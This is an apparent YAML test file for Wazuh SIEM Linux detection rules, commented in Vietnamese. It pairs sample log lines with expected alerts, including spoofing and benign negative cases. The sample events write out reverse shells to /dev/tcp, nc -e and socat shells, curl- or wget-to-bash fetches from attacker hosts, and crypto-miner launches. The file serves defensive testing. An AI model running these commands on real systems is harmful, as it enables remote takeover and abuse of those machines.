@@ -1,0 +1,556 @@
+# Ca test cho wazuh/manager/rules/0102-linux.xml (log gốc qua Wazuh thật). Nguồn: tests/legacy/linux.yml + ca biên + ca giả mạo.
+# Dòng siem-proc đi vào Wazuh với location=siem-procs (alias của <localfile>), auditd với location audit.log.
+# CA ĐẾM (LNX-005): lịch sử đếm của analysisd còn giữ qua các lần chạy trên cùng manager, và logtest luôn là agent 000. Vì vậy mỗi ca đếm
+# dùng một location riêng (<thư mục>/siem-procs, hoặc /var/log/audit/<tên>.log) vì rule khai <same_location />, và phải khởi động lại
+# manager thử (wzhdev) giữa hai lần chạy cả bộ, nếu không các lần chạy trộn lịch sử với nhau.
+
+# LNX-000: dòng siem-proc từ nguồn siem-procs được giải mã và nhận
+- rule: 102000
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=ls parent=bash exe=/usr/bin/ls cmd=ls -l'
+
+# giả mạo: dòng siem-proc (đủ tiền tố ossec: output) nằm trong syslog thường -> không rule nào báo
+- none:
+  - 102000
+  - 102001
+  - 102002
+  - 102003
+  - 102004
+  - 102005
+  - 102006
+  - 102011
+  - 102013
+  - 102014
+  - 102016
+  - 102015
+  - 102023
+  log_format: syslog
+  location: /var/log/auth.log
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=xmrig parent=bash exe=/usr/bin/xmrig cmd=./xmrig -o stratum+tcp://pool.example:3333'
+
+# giả mạo: kẻ tấn công đặt chuỗi siem-proc vào URL của web access log
+- none:
+  - 102000
+  - 102001
+  - 102002
+  - 102003
+  - 102004
+  - 102005
+  - 102006
+  - 102011
+  - 102013
+  - 102014
+  - 102016
+  - 102015
+  - 102023
+  log_format: apache
+  location: /var/log/apache2/access.log
+  events:
+  - 203.0.113.9 - - [31/Oct/2026:10:00:00 +0700] "GET /?x=siem-proc:%20pid=1%20ppid=2%20uid=0%20name=sh%20parent=httpd%20exe=/bin/sh%20cmd=bash%20-i%20>&%20/dev/tcp/1.2.3.4/4 HTTP/1.1" 200 12 "-" "curl/8"
+
+# giả mạo: sshd ghi tên người dùng chứa chuỗi siem-proc (không có tiền tố ossec: output)
+- none:
+  - 102000
+  - 102001
+  - 102002
+  - 102003
+  - 102004
+  - 102005
+  - 102006
+  - 102011
+  - 102013
+  - 102014
+  - 102016
+  - 102015
+  - 102023
+  log_format: syslog
+  location: /var/log/auth.log
+  events:
+  - 'Oct 31 10:00:00 host sshd[1234]: Invalid user siem-proc: pid=1 ppid=2 uid=0 name=sh parent=httpd exe=/bin/sh cmd=sh from 203.0.113.9 port 4444'
+
+# LNX-001 siem-proc: bash -i tới /dev/tcp
+- rule: 102001
+  legacy: LNX-001
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=bash parent=bash exe=/usr/bin/bash cmd=bash -i >& /dev/tcp/203.0.113.5/4444 0>&1'
+
+# LNX-001 auditd
+- rule: 102011
+  legacy: LNX-001
+  log_format: audit
+  location: /var/log/audit/audit.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.100:100): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4100 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="bash" exe="/usr/bin/bash" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.100:100): argc=5 a0="bash" a1="-i" a2=">&" a3="/dev/tcp/203.0.113.5/4444" a4="0>&1" type=CWD msg=audit(1767225600.100:100): cwd="/root"'
+
+# LNX-001 siem-proc: /dev/tcp với IP, không có bash -i
+- rule: 102001
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=sh parent=bash exe=/usr/bin/sh cmd=sh -c exec 5<>/dev/tcp/203.0.113.5/4444'
+
+# LNX-001 auditd: nc -e /bin/sh
+- rule: 102011
+  log_format: audit
+  location: /var/log/audit/audit.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.101:101): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4101 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="nc" exe="/usr/bin/nc" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.101:101): argc=5 a0="nc" a1="203.0.113.5" a2="4444" a3="-e" a4="/bin/sh" type=CWD msg=audit(1767225600.101:101): cwd="/root"'
+
+# LNX-001 siem-proc: nc -e /bin/bash
+- rule: 102001
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=nc parent=bash exe=/usr/bin/nc cmd=nc 203.0.113.5 4444 -e /bin/bash'
+
+# LNX-001 siem-proc: socat exec
+- rule: 102001
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=socat parent=bash exe=/usr/bin/socat cmd=socat tcp:203.0.113.5:4444 exec:/bin/sh'
+
+# LNX-001 auditd: python -c socket connect
+- rule: 102011
+  log_format: audit
+  location: /var/log/audit/audit.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.102:102): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4102 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="python3" exe="/usr/bin/python3" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.102:102): argc=4 a0="python3" a1="-c" a2="import" a3="socket,os;s=socket.socket();s.connect((203.0.113.5,4444))" type=CWD msg=audit(1767225600.102:102): cwd="/root"'
+
+# LNX-001 siem-proc: pty.spawn
+- rule: 102001
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=python3 parent=bash exe=/usr/bin/python3 cmd=python3 -c import pty;pty.spawn(''/bin/bash'')'
+
+# LNX-001 auditd: mkfifo /tmp
+- rule: 102011
+  log_format: audit
+  location: /var/log/audit/audit.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.103:103): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4103 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="mkfifo" exe="/usr/bin/mkfifo" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.103:103): argc=2 a0="mkfifo" a1="/tmp/f" type=CWD msg=audit(1767225600.103:103): cwd="/root"'
+
+# LNX-001 âm siem-proc: nc kiểm tra cổng (không -e)
+- none:
+  - 102001
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=nc parent=bash exe=/usr/bin/nc cmd=nc -zv 10.0.0.5 22'
+
+# LNX-001 âm auditd: nc kiểm tra cổng
+- none:
+  - 102011
+  log_format: audit
+  location: /var/log/audit/audit.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.100:100): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4100 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="nc" exe="/usr/bin/nc" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.100:100): argc=4 a0="nc" a1="-zv" a2="10.0.0.5" a3="22" type=CWD msg=audit(1767225600.100:100): cwd="/root"'
+
+# LNX-001 âm siem-proc: mkfifo ngoài /tmp
+- none:
+  - 102001
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=mkfifo parent=bash exe=/usr/bin/mkfifo cmd=mkfifo /var/run/app.fifo'
+
+# LNX-002 httpd sinh sh
+- rule: 102002
+  legacy: LNX-002
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=947 ppid=900 uid=0 name=sh parent=httpd exe=/usr/bin/sh cmd=sh -c sleep 15'
+
+# LNX-002 nginx sinh python3
+- rule: 102002
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=python3 parent=nginx exe=/usr/bin/python3 cmd=python3 -c print(1)'
+
+# LNX-002 php-fpm sinh whoami (cũng là lệnh trinh sát; LNX-002 đứng trước nên là rule báo)
+- rule: 102002
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=whoami parent=php-fpm exe=/usr/bin/whoami cmd=whoami'
+
+# LNX-002 âm: httpd sinh rotatelogs
+- none:
+  - 102002
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=rotatelogs parent=httpd exe=/usr/bin/rotatelogs cmd=rotatelogs'
+
+# LNX-002 âm: sh có cha là bash
+- none:
+  - 102002
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=sh parent=bash exe=/usr/bin/sh cmd=sh -c ls'
+
+# LNX-002 âm: tên cha chỉ chứa 'httpd' (không khớp chính xác)
+- none:
+  - 102002
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=sh parent=httpd-helper exe=/usr/bin/sh cmd=sh -c ls'
+
+# LNX-002 âm: tên tiến trình chỉ chứa 'sh' (bash2)
+- none:
+  - 102002
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=bash2 parent=httpd exe=/usr/bin/bash2 cmd=bash2 -c ls'
+
+# LNX-002 âm: httpd sinh sh nhưng dòng nằm ở nguồn khác (giả mạo)
+- none:
+  - 102002
+  log_format: syslog
+  location: /var/log/syslog
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=sh parent=httpd exe=/usr/bin/sh cmd=sh -c id'
+
+# LNX-002 âm auditd: không có tên tiến trình cha nên rule chỉ chạy trên siem-proc
+- none:
+  - 102002
+  log_format: audit
+  location: /var/log/audit/audit.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.110:110): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=900 pid=4110 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="sh" exe="/usr/bin/sh" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.110:110): argc=3 a0="sh" a1="-c" a2="id" type=CWD msg=audit(1767225600.110:110): cwd="/root"'
+
+# LNX-003 siem-proc: curl | bash từ IP lạ
+- rule: 102003
+  legacy: LNX-003
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=bash parent=bash exe=/usr/bin/bash cmd=curl -s http://203.0.113.5/x.sh | bash'
+
+# LNX-003 auditd
+- rule: 102013
+  legacy: LNX-003
+  log_format: audit
+  location: /var/log/audit/audit.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.100:100): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4100 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="bash" exe="/usr/bin/bash" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.100:100): argc=5 a0="curl" a1="-s" a2="http://203.0.113.5/x.sh" a3="|" a4="bash" type=CWD msg=audit(1767225600.100:100): cwd="/root"'
+
+# LNX-003 siem-proc: wget -qO- raw.githubusercontent.com của kẻ tấn công | sh (không thuộc danh sách tin cậy)
+- rule: 102003
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=sh parent=bash exe=/usr/bin/sh cmd=wget -qO- https://raw.githubusercontent.com/attacker/x/main/x.sh | sh'
+
+# LNX-003 siem-proc: tải vào /tmp rồi chmod +x
+- rule: 102003
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=sh parent=bash exe=/usr/bin/sh cmd=curl -o /tmp/x http://203.0.113.5/x && chmod +x /tmp/x'
+
+# LNX-003 auditd: curl -o /tmp/x && chmod +x
+- rule: 102023
+  log_format: audit
+  location: /var/log/audit/audit.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.104:104): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4104 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="sh" exe="/usr/bin/sh" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.104:104): argc=8 a0="curl" a1="-o" a2="/tmp/x" a3="http://203.0.113.5/x" a4="&&" a5="chmod" a6="+x" a7="/tmp/x" type=CWD msg=audit(1767225600.104:104): cwd="/root"'
+
+# LNX-003 âm siem-proc: bộ cài Docker chính thức
+- none:
+  - 102003
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=sh parent=bash exe=/usr/bin/sh cmd=curl -fsSL https://get.docker.com | sh'
+
+# LNX-003 âm auditd: bộ cài Docker chính thức
+- none:
+  - 102013
+  - 102023
+  log_format: audit
+  location: /var/log/audit/audit.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.100:100): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4100 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="sh" exe="/usr/bin/sh" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.100:100): argc=5 a0="curl" a1="-fsSL" a2="https://get.docker.com" a3="|" a4="sh" type=CWD msg=audit(1767225600.100:100): cwd="/root"'
+
+# LNX-003 âm siem-proc: bộ cài nvm chính thức
+- none:
+  - 102003
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=bash parent=bash exe=/usr/bin/bash cmd=curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash'
+
+# LNX-003 âm siem-proc: curl không pipe vào shell
+- none:
+  - 102003
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=curl parent=bash exe=/usr/bin/curl cmd=curl -s http://203.0.113.5/x.sh -o x.sh'
+
+# LNX-004 siem-proc: xmrig
+- rule: 102004
+  legacy: LNX-004
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=xmrig parent=bash exe=/usr/bin/xmrig cmd=./xmrig -o stratum+tcp://pool.example:3333'
+
+# LNX-004 auditd: xmrig
+- rule: 102014
+  legacy: LNX-004
+  log_format: audit
+  location: /var/log/audit/audit.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.100:100): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4100 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="xmrig" exe="/usr/bin/xmrig" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.100:100): argc=3 a0="./xmrig" a1="-o" a2="stratum+tcp://pool.example:3333" type=CWD msg=audit(1767225600.100:100): cwd="/root"'
+
+# LNX-004 siem-proc: tên bình thường nhưng đối số --donate-level
+- rule: 102004
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=python3 parent=bash exe=/usr/bin/python3 cmd=python3 m.py --donate-level 1'
+
+# LNX-004 auditd: kinsing
+- rule: 102014
+  log_format: audit
+  location: /var/log/audit/audit.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.105:105): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4105 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="kinsing" exe="/tmp/kinsing" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.105:105): argc=1 a0="/tmp/kinsing" type=CWD msg=audit(1767225600.105:105): cwd="/root"'
+
+# LNX-004 siem-proc: pool.minexmr
+- rule: 102004
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=curl parent=bash exe=/usr/bin/curl cmd=curl pool.minexmr.com'
+
+# LNX-004 âm siem-proc: huấn luyện ML
+- none:
+  - 102004
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=python3 parent=bash exe=/usr/bin/python3 cmd=python3 train.py --epochs 10'
+
+# LNX-004 âm auditd: huấn luyện ML
+- none:
+  - 102014
+  log_format: audit
+  location: /var/log/audit/audit.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.100:100): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4100 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="python3" exe="/usr/bin/python3" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.100:100): argc=4 a0="python3" a1="train.py" a2="--epochs" a3="10" type=CWD msg=audit(1767225600.100:100): cwd="/root"'
+
+# LNX-004 âm siem-proc: tên chỉ chứa 'xmrig' (xmrigtool), không khớp chính xác
+- none:
+  - 102004
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=xmrigtool parent=bash exe=/usr/bin/xmrigtool cmd=xmrigtool --help'
+
+# LNX-005 siem-proc: 4 lệnh trinh sát khác nhau (đúng ngưỡng)
+- rule: 102005
+  legacy: LNX-005
+  log_format: syslog
+  location: l5-pos/siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=whoami parent=bash exe=/usr/bin/whoami cmd=whoami'
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=id parent=bash exe=/usr/bin/id cmd=id'
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=uname parent=bash exe=/usr/bin/uname cmd=uname'
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=hostname parent=bash exe=/usr/bin/hostname cmd=hostname'
+
+# LNX-005 auditd: 4 lệnh trinh sát khác nhau
+- rule: 102015
+  legacy: LNX-005
+  log_format: audit
+  location: /var/log/audit/l5-pos.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.200:200): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4200 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="whoami" exe="/usr/bin/whoami" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.200:200): argc=1 a0="whoami" type=CWD msg=audit(1767225600.200:200): cwd="/root"'
+  - 'type=SYSCALL msg=audit(1767225600.201:201): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4201 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="id" exe="/usr/bin/id" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.201:201): argc=1 a0="id" type=CWD msg=audit(1767225600.201:201): cwd="/root"'
+  - 'type=SYSCALL msg=audit(1767225600.202:202): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4202 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="uname" exe="/usr/bin/uname" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.202:202): argc=1 a0="uname" type=CWD msg=audit(1767225600.202:202): cwd="/root"'
+  - 'type=SYSCALL msg=audit(1767225600.203:203): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4203 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="hostname" exe="/usr/bin/hostname" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.203:203): argc=1 a0="hostname" type=CWD msg=audit(1767225600.203:203): cwd="/root"'
+
+# LNX-005 âm siem-proc: 3 lệnh khác nhau (dưới ngưỡng)
+- none:
+  - 102005
+  log_format: syslog
+  location: l5-three/siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=whoami parent=bash exe=/usr/bin/whoami cmd=whoami'
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=id parent=bash exe=/usr/bin/id cmd=id'
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=uname parent=bash exe=/usr/bin/uname cmd=uname'
+
+# LNX-005 âm auditd: 3 lệnh khác nhau
+- none:
+  - 102015
+  log_format: audit
+  location: /var/log/audit/l5-three.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.200:200): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4200 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="whoami" exe="/usr/bin/whoami" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.200:200): argc=1 a0="whoami" type=CWD msg=audit(1767225600.200:200): cwd="/root"'
+  - 'type=SYSCALL msg=audit(1767225600.201:201): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4201 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="id" exe="/usr/bin/id" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.201:201): argc=1 a0="id" type=CWD msg=audit(1767225600.201:201): cwd="/root"'
+  - 'type=SYSCALL msg=audit(1767225600.202:202): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4202 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="uname" exe="/usr/bin/uname" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.202:202): argc=1 a0="uname" type=CWD msg=audit(1767225600.202:202): cwd="/root"'
+
+# LNX-005 âm siem-proc: ps lặp lại 6 lần
+- none:
+  - 102005
+  log_format: syslog
+  location: l5-ps/siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=ps parent=bash exe=/usr/bin/ps cmd=ps'
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=ps parent=bash exe=/usr/bin/ps cmd=ps'
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=ps parent=bash exe=/usr/bin/ps cmd=ps'
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=ps parent=bash exe=/usr/bin/ps cmd=ps'
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=ps parent=bash exe=/usr/bin/ps cmd=ps'
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=ps parent=bash exe=/usr/bin/ps cmd=ps'
+
+# LNX-005 âm auditd: ps lặp lại 6 lần
+- none:
+  - 102015
+  log_format: audit
+  location: /var/log/audit/l5-ps.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.200:200): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4200 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="ps" exe="/usr/bin/ps" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.200:200): argc=1 a0="ps" type=CWD msg=audit(1767225600.200:200): cwd="/root"'
+  - 'type=SYSCALL msg=audit(1767225600.201:201): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4201 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="ps" exe="/usr/bin/ps" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.201:201): argc=1 a0="ps" type=CWD msg=audit(1767225600.201:201): cwd="/root"'
+  - 'type=SYSCALL msg=audit(1767225600.202:202): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4202 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="ps" exe="/usr/bin/ps" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.202:202): argc=1 a0="ps" type=CWD msg=audit(1767225600.202:202): cwd="/root"'
+  - 'type=SYSCALL msg=audit(1767225600.203:203): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4203 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="ps" exe="/usr/bin/ps" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.203:203): argc=1 a0="ps" type=CWD msg=audit(1767225600.203:203): cwd="/root"'
+  - 'type=SYSCALL msg=audit(1767225600.204:204): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4204 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="ps" exe="/usr/bin/ps" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.204:204): argc=1 a0="ps" type=CWD msg=audit(1767225600.204:204): cwd="/root"'
+  - 'type=SYSCALL msg=audit(1767225600.205:205): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4205 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="ps" exe="/usr/bin/ps" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.205:205): argc=1 a0="ps" type=CWD msg=audit(1767225600.205:205): cwd="/root"'
+
+# LNX-005 âm siem-proc: 2 lệnh xen kẽ, 5 dòng (< 2N-2 = 6 nên chưa báo; spike S4: báo ở dòng 6)
+- none:
+  - 102005
+  log_format: syslog
+  location: l5-alt/siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=whoami parent=bash exe=/usr/bin/whoami cmd=whoami'
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=id parent=bash exe=/usr/bin/id cmd=id'
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=whoami parent=bash exe=/usr/bin/whoami cmd=whoami'
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=id parent=bash exe=/usr/bin/id cmd=id'
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=whoami parent=bash exe=/usr/bin/whoami cmd=whoami'
+
+# LNX-005 âm auditd: 2 lệnh xen kẽ, 5 dòng
+- none:
+  - 102015
+  log_format: audit
+  location: /var/log/audit/l5-alt.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.200:200): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4200 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="whoami" exe="/usr/bin/whoami" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.200:200): argc=1 a0="whoami" type=CWD msg=audit(1767225600.200:200): cwd="/root"'
